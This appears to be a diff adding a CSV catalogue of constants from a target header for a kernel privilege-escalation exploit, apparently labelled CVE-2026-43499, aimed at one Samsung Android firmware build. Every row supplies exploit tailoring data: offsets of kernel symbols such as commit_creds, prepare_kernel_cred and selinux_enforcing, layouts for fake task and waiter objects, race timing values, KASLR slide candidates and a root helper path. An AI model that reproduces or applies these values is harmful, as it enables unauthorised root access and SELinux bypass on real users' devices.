@@ -1,0 +1,181 @@
+NAME,VALUE,FILE,LINE,CATEGORY,DERIVATION_SOURCE,PURPOSE
+OFFSET_H,,target.h,2,UNKNOWN,SOURCE_CODE,Header include guard macro
+BUILD_VARIANT_LABEL,"""gts9fewifi-X510XXSEEZG3-app""",target.h,7,BUILD_METADATA,EMPIRICAL,Target build identifier label
+PHYS_P0_ORACLE,1,target.h,8,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+SLIDE_ROUTE,SLIDE_ROUTE_FPSIMD,target.h,9,EXPLOIT_ALGORITHM_CONSTANT,SOC_ARCHITECTURE,Signal/FPSIMD route selection determined by ARM64 CPU context and Android SELinux
+BUILD_FINGERPRINT,"""samsung/gts9fewifixx/gts9fewifi:16/BP4A.251205.006/X510XXSEEZG3:user/release-keys""",target.h,12,FIRMWARE_FINGERPRINT,EMPIRICAL,Official Android OS build fingerprint string
+MM_STRUCT_SZ,0x400,target.h,18,EXPLOIT_ALGORITHM_CONSTANT,BTF,SLUB allocation bucket size kmalloc-1k (0x400) for struct mm_struct (sizeof=0x3e0)
+KMALLOC_CGROUP_TYPE,1,target.h,20,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+KMALLOC_CACHE_TYPES,3,target.h,21,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS,2,target.h,26,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+FOPS_KERNEL_PAGE_SETUP_ATTEMPTS,2,target.h,27,RUNTIME_TUNING,EMPIRICAL,Timing delay and retry limit for fops race
+FOPS_ROUTE_COARSE_DELAY_USEC,50000,target.h,28,RUNTIME_TUNING,EMPIRICAL,Timing delay and retry limit for fops race
+FOPS_ROUTE_FINE_DELAY_TICKS,"0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL",target.h,29,RUNTIME_TUNING,EMPIRICAL,Timing delay and retry limit for fops race
+PRODUCTION_STACK_PI_RIGHT_ONLY,0,target.h,31,EXPLOIT_ALGORITHM_CONSTANT,KERNEL_MEMORY_LAYOUT,Rbtree child orientation (tree_left vs tree_right) based on kernel virtual address ordering
+DEFAULT_EXPLOIT_ATTEMPTS,8,target.h,33,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+DEFAULT_ATTEMPT_TIMEOUT_SEC,2200,target.h,34,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+DEFAULT_P0_ATTEMPT_TIMEOUT_SEC,1200,target.h,35,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+KIMAGE_TEXT_BASE,0xffffffc008000000ULL,target.h,40,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,ARM64 kernel virtual memory map region boundary
+P0_PAGE_OFFSET,0xffffff8000000000ULL,target.h,41,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,ARM64 kernel virtual memory map region boundary
+P0_PHYS_OFFSET,0x80000000ULL,target.h,43,SOC_CONSTANT,SOC_ARCHITECTURE,Exynos 1380 physical DRAM base load address (0x80000000)
+P0_KERNEL_PHYS_LOAD,0x80000000ULL,target.h,46,SOC_CONSTANT,SOC_ARCHITECTURE,Exynos 1380 physical DRAM base load address (0x80000000)
+KERNELSNITCH_IDENTITY_END,0xffffff9000000000ULL,target.h,49,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,ARM64 kernel virtual memory map region boundary
+DIRECT_MAP_BASE,0xffffff8000000000ULL,target.h,50,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,ARM64 kernel virtual memory map region boundary
+DIRECT_MAP_END,0xffffff9000000000ULL,target.h,51,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,ARM64 kernel virtual memory map region boundary
+VMEMMAP_START,0xfffffffe00000000ULL,target.h,52,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,ARM64 kernel virtual memory map region boundary
+P0_ORACLE_GATE_SLOT,0,target.h,57,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+P0_ORACLE_PROBE_SLOT,1,target.h,58,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+P0_ORACLE_GATE_RESTORE_SLOT,2,target.h,59,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+P0_ORACLE_PROBE_RESTORE_SLOT,3,target.h,60,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+P0_ORACLE_GATE_PAGE_OFF,0x0e80,target.h,61,PAYLOAD_SYNTHETIC_LAYOUT,EMPIRICAL,Offset of configfs gate object within page
+P0_ORACLE_GATE_OBJECT_INDEX,1,target.h,62,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+P0_ORACLE_PROBE_OFFSET,0x1f0000ULL,target.h,63,KERNEL_MEMORY_LAYOUT,EMPIRICAL,Relative physical probe address for P0 oracle
+P0_FINGERPRINT_HEADER,"""targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h""",target.h,64,BUILD_METADATA,SOURCE_CODE,Relative path to target physical fingerprint header
+P0_FINGERPRINT_MIN_BEST,5,target.h,66,EXPLOIT_ALGORITHM_CONSTANT,EMPIRICAL,Minimum score threshold (5/8 words) to accept a physical page candidate fingerprint
+P0_FINGERPRINT_MIN_MARGIN,3,target.h,67,EXPLOIT_ALGORITHM_CONSTANT,EMPIRICAL,Minimum lead margin (3 words) between best and second candidate in P0 oracle scoring
+SLIDE_P0_OFFSET_CANDIDATES,"0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, 0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, 0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, 0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, 0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, 0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, 0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, 0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL",target.h,72,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_MAX_ATTEMPTS,32,target.h,81,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_KASLR_STEP,0x4000ULL,target.h,82,KERNEL_MEMORY_LAYOUT,SOC_ARCHITECTURE,KASLR page alignment granularity (16KB / 0x4000)
+SLIDE_TRACEFS_EVENT_ID,108,target.h,83,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_TRACEFS_WORKER_CALLER_OFF,0x00108668ULL,target.h,84,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+SLIDE_FAKE_WAITER_PRIO,0,target.h,89,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+SLIDE_WAIT_NSEC,2000000000L,target.h,90,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_REQUEUE_ARM_USEC,20000,target.h,91,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_USE_FAKE_TASK,1,target.h,92,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+COMPACT_RT_MUTEX_WAITER,1,target.h,93,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+SLIDE_RB_PARENT_TYPE_RESTORE,1ULL,target.h,94,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+SLIDE_KSNITCH_APPENDED_FUTEXES,2048,target.h,97,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_KSNITCH_REPEAT_MEASUREMENT,64,target.h,98,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_KSNITCH_AVERAGE,8,target.h,99,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_KSNITCH_SCREEN_REPEAT,16,target.h,100,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_KSNITCH_SCREEN_AVERAGE,3,target.h,101,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_BANK_SLOTS,4,target.h,104,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_BANK_TASK_OFF,0x1000,target.h,105,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Internal layout and stride for multi-slot controlled-mm bank
+SLIDE_BANK_TASK_STRIDE,0x1c0,target.h,106,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Internal layout and stride for multi-slot controlled-mm bank
+SLIDE_BANK_LOCK_OFF,0x5200,target.h,107,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Internal layout and stride for multi-slot controlled-mm bank
+SLIDE_BANK_SLOT_STRIDE,0x100,target.h,108,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Internal layout and stride for multi-slot controlled-mm bank
+SLIDE_BANK_WAITER_OFF,0x40,target.h,109,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Internal layout and stride for multi-slot controlled-mm bank
+SKB_SEND_SIZE,0x8e80,target.h,114,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SKB_RECLAIM_SENDS,64,target.h,115,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+SLIDE_RECLAIM_SENDS,64,target.h,116,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+TASK_STRUCT_CRED_OFF,0x798ULL,target.h,121,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+TASK_STRUCT_REAL_CRED_OFF,0x790ULL,target.h,122,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_TASK_GROUP_OFF,0x400ULL,target.h,123,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+ROOT_UMH_PATH,"""/data/local/tmp/cve-2026-43499-root""",target.h,125,RUNTIME_TUNING,EMPIRICAL,"Empirical threshold, timeout, retry count or delay tuning"
+ROOT_UMH_WORK_OFF,0x7800,target.h,126,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of fake work_struct and exec data for usermodehelper payload
+ROOT_UMH_DATA_OFF,0x7a00,target.h,127,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of fake work_struct and exec data for usermodehelper payload
+INIT_TASK_OFF,0x0239fd80ULL,target.h,133,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+PREPARE_KERNEL_CRED_OFF,0x00113a88ULL,target.h,134,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+COMMIT_CREDS_OFF,0x00113330ULL,target.h,135,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+OVERRIDE_CREDS_OFF,0x00113718ULL,target.h,136,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ROOT_TASK_GROUP_OFF,0x02591f40ULL,target.h,137,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SELINUX_ENFORCING_OFF,0x026654e8ULL,target.h,138,KERNEL_DATA_SYMBOL,DISASSEMBLY,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+KMALLOC_CACHES_OFF,0x01b04c70ULL,target.h,139,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+ANON_PIPE_BUF_OPS_OFF,0x01912de0ULL,target.h,140,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SYSTEM_UNBOUND_WQ_OFF,0x0238ae20ULL,target.h,141,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+CALL_USERMODEHELPER_EXEC_WORK_OFF,0x00100eecULL,target.h,142,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ASHMEM_FOPS_OFF,0x01ab3c08ULL,target.h,145,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+ASHMEM_MISC_FOPS_OFF,0x024ff750ULL,target.h,146,KERNEL_DATA_SYMBOL,DISASSEMBLY,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+ASHMEM_IOCTL_OFF,0x00d026c0ULL,target.h,147,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ASHMEM_COMPAT_IOCTL_OFF,0x00d02c78ULL,target.h,148,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ASHMEM_MMAP_OFF,0x00d02cd0ULL,target.h,149,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ASHMEM_OPEN_OFF,0x00d02f0cULL,target.h,150,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ASHMEM_RELEASE_OFF,0x00d02f90ULL,target.h,151,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+ASHMEM_SHOW_FDINFO_OFF,0x00d030b0ULL,target.h,152,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+CONFIGFS_READ_ITER_OFF,0x004759c4ULL,target.h,153,KERNEL_TEXT_OFFSET,DISASSEMBLY,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+CONFIGFS_BIN_WRITE_ITER_OFF,0x00475e80ULL,target.h,154,KERNEL_TEXT_OFFSET,DISASSEMBLY,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+COPY_SPLICE_READ_OFF,0x003fcb5cULL,target.h,155,KERNEL_TEXT_OFFSET,DISASSEMBLY,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+NOOP_LLSEEK_OFF,0x003b1d24ULL,target.h,156,KERNEL_TEXT_OFFSET,SYSTEM_MAP,Offset of executable kernel function relative to KIMAGE_TEXT_BASE
+SLIDE_NFULNL_LOGGER_NAME_OFF,0x017fdc14ULL,target.h,159,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SLIDE_NFULNL_LOGGER_OBJECT_OFF,0x023925a0ULL,target.h,160,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF,0x024be6f8ULL,target.h,161,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SLIDE_INIT_TASK_OFF,INIT_TASK_OFF,target.h,162,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SLIDE_ROOT_TASK_GROUP_OFF,ROOT_TASK_GROUP_OFF,target.h,163,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+SLIDE_SYSCTL_BOOTID_OFF,0x0274a5c9ULL,target.h,164,KERNEL_DATA_SYMBOL,SYSTEM_MAP,Offset of static kernel data structure relative to KIMAGE_TEXT_BASE
+INIT_TASK,(KIMAGE_TEXT_BASE + INIT_TASK_OFF),target.h,170,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ROOT_TASK_GROUP,(KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF),target.h,171,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SELINUX_ENFORCING,(KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF),target.h,172,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+KMALLOC_CACHES,(KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF),target.h,173,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ANON_PIPE_BUF_OPS,(KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF),target.h,174,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SYSTEM_UNBOUND_WQ,(KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF),target.h,175,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+CALL_USERMODEHELPER_EXEC_WORK,(KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF),target.h,176,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_MISC_FOPS,(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF),target.h,179,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_FOPS,(KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF),target.h,180,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_IOCTL,(KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF),target.h,181,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_COMPAT_IOCTL,(KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF),target.h,182,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_MMAP,(KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF),target.h,183,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_OPEN,(KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF),target.h,184,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_RELEASE,(KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF),target.h,185,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+ASHMEM_SHOW_FDINFO,(KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF),target.h,186,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+CONFIGFS_READ_ITER,(KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF),target.h,187,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+CONFIGFS_BIN_WRITE_ITER,(KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF),target.h,188,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+COPY_SPLICE_READ,(KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF),target.h,189,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+NOOP_LLSEEK,(KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF),target.h,190,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SLIDE_NFULNL_LOGGER_NAME_IMAGE,(KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF),target.h,193,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SLIDE_NFULNL_LOGGER_OBJECT_IMAGE,(KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF),target.h,195,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE,(KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF),target.h,197,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SLIDE_INIT_TASK_IMAGE,(KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF),target.h,199,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SLIDE_ROOT_TASK_GROUP_IMAGE,(KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF),target.h,200,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+SLIDE_SYSCTL_BOOTID_IMAGE,(KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF),target.h,202,KERNEL_SYMBOL,SOURCE_CODE,Absolute virtual address computed from text base plus symbol offset
+LOCK_OFF,0x2210,target.h,208,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+W0_OFF,0x2350,target.h,209,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+FOPS_OFF,0x7000,target.h,210,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+SCRATCH_OFF,0x3000,target.h,211,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+RIGHT_OFF,0x4440,target.h,212,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+LEFT_OFF,0x5550,target.h,213,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+FAKE_TASK_OFF,0x3200,target.h,214,PAYLOAD_SYNTHETIC_LAYOUT,PAYLOAD_LAYOUT,Offset of synthetic object within controlled-mm payload scratch page
+FAKE_WAITER_PI_TREE_ENTRY_OFF,0x18,target.h,217,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_WAITER_TASK_OFF,0x30,target.h,218,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_WAITER_LOCK_OFF,0x38,target.h,219,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_WAITER_WAKE_STATE_OFF,0x40,target.h,220,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_WAITER_PRIO_OFF,0x44,target.h,221,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_WAITER_DEADLINE_OFF,0x48,target.h,222,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_WAITER_WW_CTX_OFF,0x50,target.h,223,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_USAGE_OFF,0x38,target.h,226,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_PRIO_OFF,0x7c,target.h,227,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_NORMAL_PRIO_OFF,0x84,target.h,228,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_PI_LOCK_OFF,0x884,target.h,229,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_PI_WAITERS_OFF,0x898,target.h,230,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_PI_TOP_TASK_OFF,0x8a8,target.h,231,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FAKE_TASK_PI_BLOCKED_ON_OFF,0x8b0,target.h,232,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+CFG_PAGE_OFF,16,target.h,237,KERNEL_STRUCT_MEMBER,DWARF,Member offset in struct configfs_buffer
+CFG_NEEDS_READ_FILL_OFF,80,target.h,238,KERNEL_STRUCT_MEMBER,DWARF,Member offset in struct configfs_buffer
+CFG_BIN_BUFFER_OFF,88,target.h,239,KERNEL_STRUCT_MEMBER,DWARF,Member offset in struct configfs_buffer
+CFG_BIN_BUFFER_SIZE_OFF,96,target.h,240,KERNEL_STRUCT_MEMBER,DWARF,Member offset in struct configfs_buffer
+CFG_CB_MAX_SIZE_OFF,100,target.h,241,KERNEL_STRUCT_MEMBER,DWARF,Member offset in struct configfs_buffer
+WQ_DFL_PWQ_OFF,0xb0,target.h,246,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_POOL_OFF,0x00,target.h,247,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_WQ_OFF,0x08,target.h,248,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_WORK_COLOR_OFF,0x10,target.h,249,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_REFCNT_OFF,0x18,target.h,250,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_NR_IN_FLIGHT_OFF,0x1c,target.h,251,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_NR_ACTIVE_OFF,0x5c,target.h,252,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PWQ_MAX_ACTIVE_OFF,0x60,target.h,253,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+POOL_WORKLIST_OFF,0x20,target.h,254,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+POOL_NR_IDLE_OFF,0x34,target.h,255,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+WORK_DATA_OFF,0x00,target.h,258,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+WORK_ENTRY_OFF,0x08,target.h,259,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+WORK_FUNC_OFF,0x18,target.h,260,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+STRUCT_PAGE_SIZE,0x40,target.h,265,KERNEL_STRUCT_SIZE,BTF,Exact size of struct page (64 bytes / 0x40)
+STRUCT_PAGE_COMPOUND_HEAD_OFF,0x08,target.h,266,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+STRUCT_SLAB_CACHE_OFF,0x18,target.h,267,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+STRUCT_PAGE_TYPE_OFF,0x30,target.h,268,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+PIPE_BUFFER_SLOTS,32,target.h,273,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+PIPE_BUF_FLAG_CAN_MERGE,0x10,target.h,274,EXPLOIT_ALGORITHM_CONSTANT,PAYLOAD_LAYOUT,Algorithmic parameter controlling payload execution path
+FOPS_OWNER_OFF,0x00,target.h,279,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_LLSEEK_OFF,0x08,target.h,280,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_READ_OFF,0x10,target.h,281,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_WRITE_OFF,0x18,target.h,282,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_READ_ITER_OFF,0x20,target.h,283,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_WRITE_ITER_OFF,0x28,target.h,284,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_IOCTL_OFF,0x50,target.h,285,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_COMPAT_IOCTL_OFF,0x58,target.h,286,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_MMAP_OFF,0x60,target.h,287,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_OPEN_OFF,0x70,target.h,288,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
+FOPS_RELEASE_OFF,0x80,target.h,289,KERNEL_STRUCT_MEMBER,BTF,Member offset in real kernel data structure
